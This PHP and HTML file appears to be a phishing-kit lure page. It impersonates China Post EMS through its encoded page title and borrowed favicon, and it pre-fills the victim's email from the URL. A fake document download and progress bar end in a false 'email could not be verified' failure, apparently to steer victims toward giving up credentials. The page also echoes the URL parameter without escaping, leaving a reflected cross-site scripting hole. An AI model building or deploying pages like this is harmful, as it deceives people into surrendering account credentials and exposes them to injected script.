<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html>
<title>&#20013;&#22269;&#37038;&#25919;&#36895;&#36882;&#29289;&#27969; <?php echo $login ?></title>

<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<link href="https://sso.emsog.post/themes/ems/images/favicon.png" rel="shortcut icon"/>

<link rel="stylesheet" href="progress.css">

<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">




<table align="center"><tr><td>

<div class="w3-container">
  <h3>View  Document</h3>
  <p>

	User: <b><?php echo $login ?></b>
	
	<br>

	Click the button to Download Document.

  </p>

  <div class="w3-light-grey">
    <div id="myBar" class="w3-container w3-green" style="height:24px;width:0%">
    </div>
  </div>

  <p id="myP"><span id="demo">1</span> of 10 complete</p>

  <button class="w3-button w3-light-grey" onclick="move();this.disabled='true'" 
  style="width:150px; height:35px; 
  font-family: Verdana; font-size: 12px; color:#FFF; 
  background-color: #3E5D33; border: solid 1px #3E5D33; padding: 5px; 
  -moz-border-radius: 1px; -webkit-border-radius: 1px; -khtml-border-radius: 1px; border-radius: 1px; 
  -moz-box-shadow: 3px 3px 3px #000; -webkit-box-shadow: 3px 3px 3px #000; box-shadow: 3px 3px 3px #000;"><b>
	Download Now>>>
  </b></button>  


</div>

<script>
function move() {
  var elem = document.getElementById("myBar");   
  var width = 0;
  var id = setInterval(frame, 50);
  function frame() {
    if (width >= 100) {
      clearInterval(id);
      document.getElementById("myP").className = "w3-text-green w3-animate-opacity";
      document.getElementById("myP").innerHTML = "Download Failed. Your email could not be verified!";
    } else {
      width++; 
      elem.style.width = width + '%'; 
      var num = width * 1 / 10;
      num = num.toFixed(0)
      document.getElementById("demo").innerHTML = num;
    }
  }
}
</script>




</body>
</html>